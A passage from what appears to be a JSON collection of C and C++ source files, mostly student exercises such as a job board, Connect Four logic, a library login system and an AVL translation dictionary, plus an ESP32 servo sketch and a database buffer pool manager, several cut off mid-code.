it.\n\tvec_students.push_back(s1);\n\tvec_students.push_back(s2);\n\tvec_students.push_back(s3);\n\tvec_students.push_back(Student(\"Cameron\", \"Bucasas\", 1, 99.9f));\n\n\tfor(Student s : vec_students)\t\t//iterate through the vector and use print function\n\t{\n\t\ts.print();\n\t}\n\treturn 0;\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <fstream>\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\nstruct Job {\r\n    int id;\r\n    string title;\r\n    vector<string> skills;\r\n};\r\n\r\nstruct Application {\r\n    int jobId;\r\n    string applicantName;\r\n};\r\n\r\n// Func\u021bii\r\nvector<Job> loadJobs(const string& filename) {\r\n    vector<Job> jobs;\r\n    ifstream file(filename);\r\n    if (file.is_open()) {\r\n        int id;\r\n        string title;\r\n        int numSkills;\r\n        while (file >> id >> title >> numSkills) {\r\n            Job job;\r\n            job.id = id;\r\n            job.title = title;\r\n            for (int i = 0; i < numSkills; ++i) {\r\n                string skill;\r\n                file >> skill;\r\n                job.skills.push_back(skill);\r\n            }\r\n            jobs.push_back(job);\r\n        }\r\n        file.close();\r\n    }\r\n    return jobs;\r\n}\r\n\r\nvoid displayJobs(const vector<Job>& jobs) {\r\n    for (const auto& job : jobs) {\r\n        cout << \"Job ID: \" << job.id << \", Title: \" << job.title << \", Skills: \";\r\n        for (const auto& skill : job.skills) {\r\n            cout << skill << \" \";\r\n        }\r\n        cout << endl;\r\n    }\r\n}\r\n\r\nvector<Job> filterJobsBySkill(const vector<Job>& jobs, const string& skill) {\r\n    vector<Job> filteredJobs;\r\n    for (const auto& job : jobs) {\r\n        if (find(job.skills.begin(), job.skills.end(), skill) != job.skills.end()) {\r\n            filteredJobs.push_back(job);\r\n        }\r\n    }\r\n    return filteredJobs;\r\n}\r\n\r\nvoid applyForJob(const string& filename, int jobId, const string& applicantName) {\r\n    ofstream file(filename, ios::app);\r\n    if (file.is_open()) {\r\n        file << jobId << \" \" << applicantName << endl;\r\n        file.close();\r\n        cout << \"Application submitted successfully!\" << endl;\r\n    } else {\r\n        cout << \"Unable to open file for writing.\" << endl;\r\n    }\r\n}\r\n\r\n// Func\u021bia principal\u0103\r\nint main() {\r\n    vector<Job> jobs = loadJobs(\"jobs.txt\");\r\n\r\n    int choice;\r\n    while (true) {\r\n        cout << \"1. View all jobs\" << endl;\r\n        cout << \"2. Filter jobs by skill\" << endl;\r\n        cout << \"3. Apply for a job\" << endl;\r\n        cout << \"4. Exit\" << endl;\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n\r\n        if (choice == 1) {\r\n            displayJobs(jobs);\r\n        } else if (choice == 2) {\r\n            string skill;\r\n            cout << \"Enter skill to filter by: \";\r\n            cin >> skill;\r\n            vector<Job> filteredJobs = filterJobsBySkill(jobs, skill);\r\n            displayJobs(filteredJobs);\r\n        } else if (choice == 3) {\r\n            int jobId;\r\n            string applicantName;\r\n            cout << \"Enter Job ID to apply for: \";\r\n            cin >> jobId;\r\n            cout << \"Enter your name: \";\r\n            cin >> applicantName;\r\n            applyForJob(\"applications.txt\", jobId, applicantName);\r\n        } else if (choice == 4) {\r\n            break;\r\n        } else {\r\n            cout << \"Invalid choice. Please try again.\" << endl;\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"../include/common/game_logic.h\"\n#include <iostream>\n\nbool sobranEspaciosLibres(const std::vector<std::vector<int>> &tablero)\n{\n    for (const auto &fila : tablero)\n    {\n        for (int celda : fila)\n        {\n            if (celda == 0)\n            {\n                return true;\n            }\n        }\n    }\n    return false;\n}\n\nvoid imprimirTablero(const std::vector<std::vector<int>> &tablero)\n{\n    for (const auto &fila : tablero)\n    {\n        for (int celda : fila)\n        {\n            if (celda == 1)\n            {\n                std::cout << \" S \";\n            }\n            else if (celda == 2)\n            {\n                std::cout << \" C \";\n            }\n            else\n            {\n                std::cout << \" . \";\n            }\n        }\n        std::cout << std::endl;\n    }\n}\n\nint colocarFichaEn(std::vector<std::vector<int>> &tablero, int columna)\n{\n    for (int i = 0; i < N; i++)\n    {\n        if ((i + 1 >= N) || (tablero[i][columna] == 0 && tablero[i + 1][columna] != 0))\n        {\n            return i;\n        }\n    }\n    return -1;\n}\n\nbool columnaATope(const std::vector<std::vector<int>> &tablero, int columna)\n{\n    if (tablero[0][columna] != 0)\n    {\n        std::cout << \"No hay espacio para colocar la ficha ah\u00ed\" << std::endl;\n        return true;\n    }\n    return false;\n}\n\nbool ganador(const std::vector<std::vector<int>> &tablero, int fila, int columna, int jugador)\n{\n    auto contarFichas = [&](int df, int dc)\n    {\n        int total = 0;\n        for (int i = -3; i <= 3; i++)\n        {\n            int ni = fila + i * df, nj = columna + i * dc;\n            if (ni >= 0 && ni < N && nj >= 0 && nj < M && tablero[ni][nj] == jugador)\n            {\n                total++;\n                if (total == 4)\n                    return true;\n            }\n            else\n            {\n                total = 0;\n            }\n        }\n        return false;\n    };\n\n    return contarFichas(1, 0) || contarFichas(0, 1) || contarFichas(1, 1) || contarFichas(1, -1);\n}\n",
    "#include <Arduino.h>\n#include <ESP32Servo.h>                        \n#include \"WiFi.h\"\n\nvoid ProcessBootButton();\nvoid PerformAction1();\nvoid PerformAction2();\nvoid PerformAction3();\nvoid PerformAction4();\nvoid PerformAction5();\nvoid PerformAction6();\nvoid PerformAction7();\nvoid PerformAction8();\nvoid PerformAction9();\nvoid PerformAction10();\nvoid PerformAction11();\nvoid PerformAction12();\nvoid PerformAction13();\nvoid PerformAction14();\nvoid PerformAction15();\n\nServo handServo;                          \nServo boxServo;\n\n\n// RTC pins: GPIO2,3,0,1\nint switchStatus=0, action=1;\nbool bootButtonToggle = false;\n\nconst int ledPin = LED_BUILTIN;                    \nconst int frontSwitchPin = 0;\nconst int handServoPin = 4;\nconst int boxServoPin = 3;\nconst int bootButtonPin = 9;\n\nconst int posLidPark = 120;\nconst int posLidFull = 143;\nconst int posLidPause = 135;\nconst int posHandPark = 40;\nconst int posHandPause = 160;\nconst int posHandPauseEarly = 150;\nconst int posHandFull = 175;\n\nvoid setup()\n{\n  char string[16];\n \n  //sprintf(string, \"Start CPU Freq: %i\", getCpuFrequencyMhz());\n  //Serial.println(string);\n  //setCpuFrequencyMhz(240);\n  Serial.begin(9600);\n  Serial.println(\"Starting\");\n\n  Serial.print(\"getCpuFrequencyMhz \");\n  Serial.println(getCpuFrequencyMhz());\n\n  Serial.print(\"getXtalFrequencyMhz \");\n  Serial.println(getXtalFrequencyMhz());\n  \n  Serial.print(\"getApbFrequency \");\n  Serial.println(getApbFrequency());\n\n  //Turn off unnecessary stuff\n  btStop(); //Bluetooth\n  WiFi.mode(WIFI_OFF); // WiFi\n\n  pinMode(frontSwitchPin, INPUT);                  \n  pinMode(bootButtonPin, INPUT);\n\n  handServo.attach(handServoPin);              \n  boxServo.attach(boxServoPin);\n  boxServo.write(posLidPark);\n  handServo.write(posHandPark);\n}\n\n\nvoid loop()\n{\n  \n  ProcessBootButton();\n\n  if (action>15)\n  {\n    action=1;\n  }\n  \n\n  switchStatus = digitalRead(frontSwitchPin); \n\n  if (switchStatus == LOW){                   \n\n    if (action == 1)\n    {\n      PerformAction1();\n      action++;\n    }\n\n    else if (action == 2)\n    {\n      PerformAction2();\n      action++;\n    }\n\n    else if (action == 3)\n    {\n      PerformAction3();\n      action++;\n    }\n\n    else if (action == 4)\n    {\n      PerformAction4();\n      action++;\n    }\n\n    else if (action == 5)\n    {\n      PerformAction5();\n      action++;\n    }\n\n    else if (action == 6)             \n    {\n      PerformAction6();\n      action++;\n    }\n\n    else if (action == 7)\n    {\n      PerformAction7();\n      action++;\n    }\n\n    else if (action == 8)\n    {\n      PerformAction8();\n      action++;\n    }\n\n    else if (action == 9)\n    {\n      PerformAction9();\n      action++;\n    }\n\n    else if (action == 10)\n    {\n      PerformAction10();\n      action++;\n    }\n\n    else if (action == 11)\n    {\n      PerformAction11();\n      action++;\n    }\n\n    else if (action == 12)\n    {\n      PerformAction12();\n      action++;\n    }\n\n    else if (action == 13)\n    {\n      PerformAction13();\n      action++;\n    }\n\n    else if (action == 14)\n    {\n      PerformAction14();\n      action++;\n    }\n\n    else if (action == 15)\n    {\n      PerformAction15();\n      action++;\n    }\n  }\n}\n\nvoid ProcessBootButton()\n{\n  static bool _lastValue = HIGH;\n  if (_lastValue==HIGH && digitalRead(bootButtonPin)==LOW) // Boot Button is pulled low when pressed.\n  {\n    \n    if (bootButtonToggle){\n      Serial.println(\"Moving to Full Positions\");\n      handServo.write(posHandFull);\n      boxServo.write(posLidFull);\n      bootButtonToggle = false;\n    }\n    else \n    {\n      Serial.println(\"Moving to Park Positions\");\n      handServo.write(posHandPark);\n      boxServo.write(posLidPark);\n      bootButtonToggle = true;\n    }\n  }\n  _lastValue = digitalRead(bootButtonPin);\n}\n\nvoid PerformAction1()\n{\n  Serial.println(\"Action 1\");\n  Serial.println(\"Open Lid to Full\");            \n  for (int i = posLidPark; i <= posLidFull; i++)\n  {\n    boxServo.write(i);\n    delay(20);\n  }\n  Serial.println(\"Hand to Pause\");  \n  for (int i = posHandPark; i <= posHandPause; i++)\n  {\n    handServo.write(i);\n    delay(20);\n  }\n  delay(1000);\n  Serial.println(\"Hand to Full\");  \n  handServo.write(posHandFull);\n  delay(200);\n  Serial.println(\"Hand to Park\");  \n  for (int i = posHandFull; i >=posHandPark; i--)\n  {\n    handServo.write(i);\n    delay(20);\n  }\n  Serial.println(\"Lid to Park\");  \n  for (int i = posLidFull; i >= posLidPark; i--)\n  {\n    boxServo.write(i);\n    delay(20);\n  }\n}\n\nvoid PerformAction2()\n{\n  Serial.println(\"Action 2\");         \n  for (int i = posLidPark; i <= posLidFull; i++){\n    boxServo.write(i);\n    delay(6);\n  }\n  delay(550);\n  handServo.write(posHandFull);\n  delay(550);\n  handServo.write(posHandPark);\n  delay(550);\n  boxServo.write(posLidPark);\n  delay(1500);\n  for (int i = posLidPark; i <= posLidFull; i++){\n    boxServo.write(i);\n    delay(6);\n  }\n  delay(3000);\n  boxServo.write(posLidPark);\n}\n\nvoid PerformAction3()\n{\n  Serial.println(\"Action 3\");         \n  for (int i = posLidPark; i <= posLidFull; i++){\n    boxServo.write",
    "#include \"buffer/buffer_pool_manager.h\"\n\n#include \"common/exception.h\"\n#include \"common/macros.h\"\n#include \"pf/page_guard.h\"\n#include \"fmt/format.h\"\n\nnamespace redbase {\n\nBufferPoolManager::BufferPoolManager(size_t pool_size, PFManager *pf_manager, size_t replacer_k)\n    : pool_size_(pool_size), disk_scheduler_(std::make_unique<DiskScheduler>(pf_manager)) {\n  // we allocate a consecutive memory space for the buffer pool\n  pages_ = new Page[pool_size_];\n  replacer_ = std::make_unique<LRUKReplacer>(pool_size, replacer_k);\n\n  // Initially, every page is in the free list.\n  for (size_t i = 0; i < pool_size_; ++i) {\n    free_list_.emplace_back(static_cast<int>(i));\n  }\n\n  std::cout << fmt::format(\"Create BPM (size={}, k={})\", pool_size, replacer_k) << std::endl;\n}\n\nBufferPoolManager::~BufferPoolManager() { delete[] pages_; }\n\nauto BufferPoolManager::NewPage(page_id_t *page_id) -> Page * {\n  std::lock_guard<std::mutex> lk(latch_);\n\n  if (!free_list_.empty()) {\n    // Get The Physical Memory\n    frame_id_t fid = free_list_.front();\n    free_list_.pop_front();\n\n    // reset memory and metadata\n    *page_id = AllocatePage();\n    this->ResetMetaInfo(&pages_[fid], *page_id);\n    pages_[fid].pin_count_ = 1;\n    page_table_.insert({*page_id, fid});\n    replacer_->RecordAccess(fid);\n    return &pages_[fid];\n  }\n\n  // check if it has the evictable frame\n\n  frame_id_t fid;\n  if (!replacer_->Evict(&fid)) {\n    return nullptr;\n  }\n\n  if (pages_[fid].is_dirty_) {  // flush dirty page\n    // Get the mapping page meta info\n    const Page *evict_frame = &pages_[fid];\n    WritePageData(evict_frame->data_, evict_frame->page_id_);\n  }\n\n  // allocate the new page_id, pin the frame\n  *page_id = AllocatePage();\n  this->ResetMetaInfo(&pages_[fid], *page_id);\n  pages_[fid].pin_count_ = 1;\n\n  page_table_.insert({*page_id, fid});\n  replacer_->RecordAccess(fid);\n  return &pages_[fid];\n}\n\nauto BufferPoolManager::FetchPage(page_id_t page_id) -> Page * {\n  std::lock_guard<std::mutex> lk(latch_);\n//  std::cout << \"Fetch Page \" << page_id << std::endl;\n\n  if (page_table_.count(page_id) == 0) {\n    return nullptr;\n  }\n\n  // check if in buffer now\n  frame_id_t fid = -1;\n  for (size_t i = 0; i < pool_size_; i++) {\n    if (pages_[i].page_id_ == page_id) {\n      fid = i;\n      break;\n    }\n  }\n  if (fid != -1) {\n    pages_[fid].pin_count_++;\n    if (pages_[fid].pin_count_ > 0) {\n      replacer_->SetEvictable(fid, false);\n    }\n    return &pages_[fid];\n  }\n\n  // if not, find the replacement in the free_list\n  if (!free_list_.empty()) {\n    fid = free_list_.front();\n    free_list_.pop_front();\n\n    // set Meta Info And Read Data\n    this->ResetMetaInfo(&pages_[fid], page_id);\n    pages_[fid].pin_count_ = 1;\n    ReadPageData(pages_[fid].data_, page_id);\n\n    replacer_->RecordAccess(fid);\n    return &pages_[fid];\n  }\n\n  frame_id_t evict_id;\n  if (!replacer_->Evict(&evict_id)) {\n    return nullptr;\n  }\n\n  if (pages_[evict_id].is_dirty_) {\n    // flush\n    const Page *page = &pages_[evict_id];\n    WritePageData(page->data_, page->page_id_);\n  }\n\n  // reset meta info\n  // read data\n  this->ResetMetaInfo(&pages_[evict_id], page_id);\n  pages_[evict_id].pin_count_ = 1;\n  page_table_.insert({page_id, evict_id});\n  ReadPageData(pages_[evict_id].data_, page_id);\n  replacer_->RecordAccess(evict_id);\n\n  return &pages_[evict_id];\n}\n\nauto BufferPoolManager::UnpinPage(page_id_t page_id, bool is_dirty) -> bool {\n  std::lock_guard<std::mutex> lk(latch_);\n\n  frame_id_t frame_id = -1;\n  for (size_t i = 0; i < pool_size_; i++) {\n    if (pages_[i].page_id_ == page_id) {\n      frame_id = static_cast<int32_t>(i);\n      break;\n    }\n  }\n\n  if (frame_id == -1 || pages_[frame_id].pin_count_ == 0) {\n    return false;\n  }\n\n  pages_[frame_id].pin_count_--;\n  if (!pages_[frame_id].is_dirty_) {\n    // if page is not dirty, then could set the dirty or non-dirty\n    pages_[frame_id].is_dirty_ = is_dirty;\n  }\n\n  if (pages_[frame_id].pin_count_ == 0) {\n    replacer_->SetEvictable(frame_id, true);\n  }\n\n  return true;\n}\n\nauto BufferPoolManager::FlushPage(page_id_t page_id) -> bool {\n  std::lock_guard<std::mutex> lk(latch_);\n\n  auto page_iter = page_table_.find(page_id);\n  if (page_id == INVALID_PAGE_ID || page_iter == page_table_.end()) {\n    return false;\n  }\n\n  frame_id_t fid = page_iter->second;\n  if (pages_[fid].page_id_ != page_id) {\n    return false;\n  }\n\n  WritePageData(pages_[fid].data_, page_id);\n  pages_[fid].is_dirty_ = false;\n  return true;\n}\n\nvoid BufferPoolManager::FlushAllPages() {\n  std::lock_guard<std::mutex> lk(latch_);\n\n  for (size_t i = 0; i < pool_size_; i++) {\n    WritePageData(pages_[i].data_, pages_[i].page_id_);\n  }\n}\n\nauto BufferPoolManager::DeletePage(page_id_t page_id) -> bool {\n  std::lock_guard<std::mutex> lk(latch_);\n\n  frame_id_t frame_id = -1;\n  for (size_t i = 0; i < pool_size_; i++) {\n    if (pages_[i].page_id_ == page_id) {\n      frame_id = static_cast<int32_t>(i);\n      break;\n    }\n  }\n  if (frame_id == -1) {\n    return true;\n  }\n\n  if (pages_[frame_i",
    "/**\n * * * * * * * * * * * * * * * * * * * * * * * * * * * * *\n *                                                       *\n *       Created by: Reinier Garcia Ramos                *\n *       reymillenium@gmail.com                          *\n *                                                       *\n *       https://www.linkedin.com/in/reiniergarcia       *\n *       https://github.com/reymillenium                 *\n *       https://www.reiniergarcia.dev                   *\n *                                                       *\n * * * * * * * * * * * * * * * * * * * * * * * * * * * * *\n **/\n\n#include <iostream>\n#include <string>\n#include <iomanip>\n#include <sstream>\n\ntemplate<typename T>\nvoid printl(const T &item) {\n    std::cout << item << std::endl;\n}\n\ntemplate<typename T>\nauto get_value(const std::string &message) -> T {\n    std::cout << message;\n    T value;\n    std::cin >> value;\n    std::cin.ignore();\n    return value;\n}\n\nstd::string humanize_integer(int const integer_value) {\n    std::string integer_as_string = std::to_string(integer_value);\n    // We insert commas into the string every three digits, fromm right to left.\n    for (int j = integer_as_string.length() - 3; j > 0; j -= 3) {\n        integer_as_string.insert(j, \",\");\n    }\n    return integer_as_string;\n}\n\nstd::string humanize_double(const double double_value, const int precision = 2) {\n    const int integer_value = static_cast<int>(double_value);\n    const double decimals = double_value - integer_value;\n    // Extracts into a string the decimal part, rounded to two significant digits\n    std::stringstream stream;\n    // Places the decimals into the stream, rounded to two significant digits (by default)\n    stream << std::fixed << std::setprecision(precision) << decimals;\n    // Extracts the decimals from the stream, as a string, still rounded to two significant digits (by default)\n    const std::string decimals_as_string = stream.str(); // It still includeds the zero & the dot. Ex: 0.34 (the dot must be removed next)\n    return humanize_integer(integer_value) + decimals_as_string.substr(1, precision + 1);\n}\n\nint main() {\nspeed_input:\n    const auto speed = get_value<double>(\"What is the speed of the vehicle in mph? \");\n    if (speed < 0) {\n        printl(\"You must type a number greater or equal to 0. Please try again.\");\n        goto speed_input;\n    }\n\nhours_input:\n    const auto hours = get_value<int>(\"How many hours has it traveled? \");\n    if (hours < 1) {\n        printl(\"You must type a number greater or equal to 1. Please try again.\");\n        goto hours_input;\n    }\n\n    // Distance Traveled Breakdown Table\n    printl(\"\");\n    printl(\"* * * * * * * * * * * * * *\");\n    printl(\"*    Distance Traveled    *\");\n    printl(\"* * * * * * * * * * * * * *\");\n    printl(\"\");\n    printl(\"---------------------\");\n    printl(\"| Hour |  Distance  |\");\n    printl(\"---------------------\");\n    for (int i = 1; i <= hours; i++) {\n        const double distance = speed * i;\n        std::cout << std::fixed << std::setprecision(2) << \"| \" << std::setw(4) << i << \" | \" << std::setw(7) << humanize_double(distance) << \" mi |\" << std::endl;\n        printl(\"---------------------\");\n    }\n\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <vector>\r\n#include <string>\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\n\r\nvoid mainMenu();\r\nvoid userLogin();\r\nvoid adminLogin();\r\nvoid registerUser();\r\nvoid userMainMenu(const string& username);\r\nvoid adminMainMenu();\r\nvoid changePassword(const string& username);\r\n\r\n// Utility Functions\r\nvector<string> split(const string& s, char delimiter);\r\nbool userExists(const string& username);\r\nbool verifyUser(const string& username, const string& password);\r\nbool verifyAdmin(const string& username, const string& password);\r\nvoid saveUser(const string& username, const string& password);\r\n\r\nclass Book {\r\npublic:\r\n    string title;\r\n    string author;\r\n    string status;\r\n\r\n    Book(const string& t, const string& a, const string& s) : title(t), author(a), status(s) {}\r\n\r\n    string toString() const {\r\n        return title + \";\" + author + \";\" + status;\r\n    }\r\n};\r\n\r\nclass Admin {\r\nprivate:\r\n    vector<Book> books;\r\n\r\n    void loadBooks();\r\n    void saveBooks();\r\n\r\npublic:\r\n    Admin() { loadBooks(); }\r\n    ~Admin() { saveBooks(); }\r\n    void viewBooks();\r\n    void addBook();\r\n    void acceptRequest();\r\n    void deleteUser();\r\n};\r\n\r\nclass User {\r\nprivate:\r\n    string username;\r\n    vector<Book> books;\r\n\r\n    void loadBooks();\r\n    void saveRequest(const string& bookTitle);\r\n\r\npublic:\r\n    User(const string& user) : username(user) { loadBooks(); }\r\n    void viewBooks();\r\n    void borrowBook();\r\n    void viewRequests();\r\n    void changePassword();\r\n};\r\n\r\nvector<string> split(const string& s, char delimiter) {\r\n    vector<string> tokens;\r\n    string token;\r\n    istringstream tokenStream(s);\r\n    while (getline(tokenStream, token, delimiter)) {\r\n        tokens.push_back(token);\r\n    }\r\n    return tokens;\r\n}\r\n\r\nbool userExists(const string& username) {\r\n    ifstream file(\"users.txt\");\r\n    string line;\r\n    while (getline(file, line)) {\r\n        vector<string> user = split(line, ';');\r\n        if (user[0] == username) {\r\n            return true;\r\n        }\r\n    }\r\n    return false;\r\n}\r\n\r\nbool verifyUser(const string& username, const string& password) {\r\n    ifstream file(\"users.txt\");\r\n    string line;\r\n    while (getline(file, line)) {\r\n        vector<string> user = split(line, ';');\r\n        if (user[0] == username && user[1] == password) {\r\n            return true;\r\n        }\r\n    }\r\n    return false;\r\n}\r\n\r\nbool verifyAdmin(const string& username, const string& password) {\r\n    ifstream file(\"admins.txt\");\r\n    string line;\r\n    while (getline(file, line)) {\r\n        vector<string> admin = split(line, ';');\r\n        if (admin[0] == username && admin[1] == password) {\r\n            return true;\r\n        }\r\n    }\r\n    return false;\r\n}\r\n\r\nvoid saveUser(const string& username, const string& password) {\r\n    ofstream file(\"users.txt\", ios::app);\r\n    file << username << \";\" << password << endl;\r\n}\r\n\r\nvoid changePassword(const string& username, const string& newPassword) {\r\n    ifstream file(\"users.txt\");\r\n    ofstream tempFile(\"temp.txt\");\r\n    string line;\r\n    while (getline(file, line)) {\r\n        vector<string> user = split(line, ';');\r\n        if (user[0] == username) {\r\n            tempFile << username << \";\" << newPassword << endl;\r\n        } else {\r\n            tempFile << line << endl;\r\n        }\r\n    }\r\n    file.close();\r\n    tempFile.close();\r\n    remove(\"users.txt\");\r\n    rename(\"temp.txt\", \"users.txt\");\r\n}\r\n\r\nvoid Admin::loadBooks() {\r\n    ifstream file(\"books.txt\");\r\n    string line;\r\n    while (getline(file, line)) {\r\n        vector<string> book = split(line, ';');\r\n        books.push_back(Book(book[0], book[1], book[2]));\r\n    }\r\n}\r\n\r\nvoid Admin::saveBooks() {\r\n    ofstream file(\"books.txt\");\r\n    for (const auto& book : books) {\r\n        file << book.toString() << endl;\r\n    }\r\n}\r\n\r\nvoid Admin::viewBooks() {\r\n    cout << \"Book List:\" << endl;\r\n    for (const auto& book : books) {\r\n        cout << \"Title: \" << book.title << \", Author: \" << book.author << \", Status: \" << book.status << endl;\r\n    }\r\n}\r\n\r\nvoid Admin::addBook() {\r\n    string title, author;\r\n    cout << \"Enter book title: \";\r\n    cin.ignore();\r\n    getline(cin, title);\r\n    cout << \"Enter book author: \";\r\n    getline(cin, author);\r\n    books.push_back(Book(title, author, \"available\"));\r\n}\r\n\r\nvoid Admin::acceptRequest() {\r\n    ifstream file(\"requests.txt\");\r\n    ofstream tempFile(\"temp.txt\");\r\n    string line;\r\n    cout << \"Request List:\" << endl;\r\n    while (getline(file, line)) {\r\n        vector<string> request = split(line, ';');\r\n        cout << \"User: \" << request[0] << \", Book: \" << request[1] << \", Status: \" << request[2] << endl;\r\n    }\r\n    file.close();\r\n    \r\n    string user, bookTitle;\r\n    cout << \"Enter user name to approve request: \";\r\n    cin >> user;\r\n    cout << \"Enter book title to approve: \";\r\n    cin.ignore();\r\n    getline(cin, bookTitle);\r\n\r\n    file.open(\"requests.txt\");\r\n    while (getline(file, line)) {\r\n        vector<string> request = split(line, ';'",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <map>\r\n#include <vector>\r\n#include <algorithm>\r\n#include <sstream>\r\n#include <windows.h>\r\n\r\nusing namespace std;\r\n\r\nstruct Nodo {\r\n    string palabra_es;\r\n    map<string, string> traducciones;\r\n    Nodo* izquierdo;\r\n    Nodo* derecho;\r\n    int altura;\r\n\r\n    Nodo(string es, string it, string fr, string de, string en) {\r\n        palabra_es = es;\r\n        traducciones[\"Italiano\"] = it;\r\n        traducciones[\"Frances\"] = fr;\r\n        traducciones[\"Aleman\"] = de;\r\n        traducciones[\"Ingles\"] = en;\r\n        izquierdo = nullptr;\r\n        derecho = nullptr;\r\n        altura = 1;\r\n    }\r\n\r\n    ~Nodo() {\r\n        delete izquierdo;\r\n        delete derecho;\r\n    }\r\n};\r\n\r\nvector<string> historial_encriptado;\r\nmap<string, int> contadorPalabras;\r\n\r\nint altura(Nodo* nodo) {\r\n    if (nodo == nullptr)\r\n        return 0;\r\n    return nodo->altura;\r\n}\r\n\r\nint maximo(int a, int b) {\r\n    return (a > b) ? a : b;\r\n}\r\n\r\nint obtenerBalance(Nodo* nodo) {\r\n    if (nodo == nullptr)\r\n        return 0;\r\n    return altura(nodo->izquierdo) - altura(nodo->derecho);\r\n}\r\n\r\nNodo* rotacionDerecha(Nodo* y) {\r\n    Nodo* x = y->izquierdo;\r\n    Nodo* T2 = x->derecho;\r\n\r\n    x->derecho = y;\r\n    y->izquierdo = T2;\r\n\r\n    y->altura = maximo(altura(y->izquierdo), altura(y->derecho)) + 1;\r\n    x->altura = maximo(altura(x->izquierdo), altura(x->derecho)) + 1;\r\n\r\n    return x;\r\n}\r\n\r\nNodo* rotacionIzquierda(Nodo* x) {\r\n    Nodo* y = x->derecho;\r\n    Nodo* T2 = y->izquierdo;\r\n\r\n    y->izquierdo = x;\r\n    x->derecho = T2;\r\n\r\n    x->altura = maximo(altura(x->izquierdo), altura(x->derecho)) + 1;\r\n    y->altura = maximo(altura(y->izquierdo), altura(y->derecho)) + 1;\r\n\r\n    return y;\r\n}\r\n\r\nNodo* insertarNodo(Nodo* nodo, string es, string it, string fr, string de, string en, const string& archivo) {\r\n    if (nodo == nullptr) {\r\n        nodo = new Nodo(es, it, fr, de, en);\r\n        ofstream archivo_salida(archivo, ios::app);\r\n        archivo_salida << es << \" \" << it << \" \" << fr << \" \" << de << \" \" << en << endl;\r\n        archivo_salida.close();\r\n        return nodo;\r\n    }\r\n\r\n    if (es < nodo->palabra_es)\r\n        nodo->izquierdo = insertarNodo(nodo->izquierdo, es, it, fr, de, en, archivo);\r\n    else if (es > nodo->palabra_es)\r\n        nodo->derecho = insertarNodo(nodo->derecho, es, it, fr, de, en, archivo);\r\n    else\r\n        return nodo;\r\n\r\n    nodo->altura = 1 + maximo(altura(nodo->izquierdo), altura(nodo->derecho));\r\n\r\n    int balance = obtenerBalance(nodo);\r\n\r\n    if (balance > 1 && es < nodo->izquierdo->palabra_es)\r\n        return rotacionDerecha(nodo);\r\n\r\n    if (balance < -1 && es > nodo->derecho->palabra_es)\r\n        return rotacionIzquierda(nodo);\r\n\r\n    if (balance > 1 && es > nodo->izquierdo->palabra_es) {\r\n        nodo->izquierdo = rotacionIzquierda(nodo->izquierdo);\r\n        return rotacionDerecha(nodo);\r\n    }\r\n\r\n    if (balance < -1 && es < nodo->derecho->palabra_es) {\r\n        nodo->derecho = rotacionDerecha(nodo->derecho);\r\n        return rotacionIzquierda(nodo);\r\n    }\r\n\r\n    return nodo;\r\n}\r\n\r\nNodo* encontrarNodoMinimo(Nodo* nodo) {\r\n    Nodo* actual = nodo;\r\n    while (actual->izquierdo != nullptr)\r\n        actual = actual->izquierdo;\r\n    return actual;\r\n}\r\n\r\nNodo* eliminarNodo(Nodo* raiz, string palabra_es) {\r\n    if (raiz == nullptr)\r\n        return raiz;\r\n\r\n    if (palabra_es < raiz->palabra_es)\r\n        raiz->izquierdo = eliminarNodo(raiz->izquierdo, palabra_es);\r\n    else if (palabra_es > raiz->palabra_es)\r\n        raiz->derecho = eliminarNodo(raiz->derecho, palabra_es);\r\n    else {\r\n        if (raiz->izquierdo == nullptr || raiz->derecho == nullptr) {\r\n            Nodo* temp = raiz->izquierdo ? raiz->izquierdo : raiz->derecho;\r\n\r\n            if (temp == nullptr) {\r\n                temp = raiz;\r\n                raiz = nullptr;\r\n            } else\r\n                *raiz = *temp;\r\n            delete temp;\r\n        } else {\r\n            Nodo* temp = encontrarNodoMinimo(raiz->derecho);\r\n            raiz->palabra_es = temp->palabra_es;\r\n            raiz->derecho = eliminarNodo(raiz->derecho, temp->palabra_es);\r\n        }\r\n    }\r\n\r\n    if (raiz == nullptr)\r\n        return raiz;\r\n\r\n    raiz->altura = 1 + maximo(altura(raiz->izquierdo), altura(raiz->derecho));\r\n\r\n    int balance = obtenerBalance(raiz);\r\n\r\n    if (balance > 1 && obtenerBalance(raiz->izquierdo) >= 0)\r\n        return rotacionDerecha(raiz);\r\n\r\n    if (balance > 1 && obtenerBalance(raiz->izquierdo) < 0) {\r\n        raiz->izquierdo = rotacionIzquierda(raiz->izquierdo);\r\n        return rotacionDerecha(raiz);\r\n    }\r\n\r\n    if (balance < -1 && obtenerBalance(raiz->derecho) <= 0)\r\n        return rotacionIzquierda(raiz);\r\n\r\n    if (balance < -1 && obtenerBalance(raiz->derecho) > 0) {\r\n        raiz->derecho = rotacionDerecha(raiz->derecho);\r\n        return rotacionIzquierda(raiz);\r\n    }\r\n\r\n    return raiz;\r\n}\r\n\r\nNodo* buscarPalabra(Nodo* nodo, const string& palabra_es) {\r\n    if (nodo == nullptr || nodo->palabra_es =",
    "/*\r\nCopyright (c) 2013, iRacing.com Motorsport Simulations, LLC.\r\nAll rights reserved.\r\n\r\nRedistribution and use in source and binary forms, with or without\r\nmodification, are permitted provided that the following conditions are met:\r\n    * Redistributions of source code must retain the above copyright\r\n      notice, this list of conditions and the following disclaimer.\r\n    * Redistributions in binary form must reproduce the above copyright\r\n      notice, this list of conditions and the following disclaimer in the\r\n      documentation and/or other materials provided with the distribution.\r\n    * Neither the name of iRacing.com Motorsport Simulations nor the\r\n      names of its contributors may be used to endorse or promote products\r\n      derived from this software without specific prior written permission.\r\n\r\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND\r\nANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\r\nWARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\r\nDISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR\r\nANY DIRECT, INDIRECT, 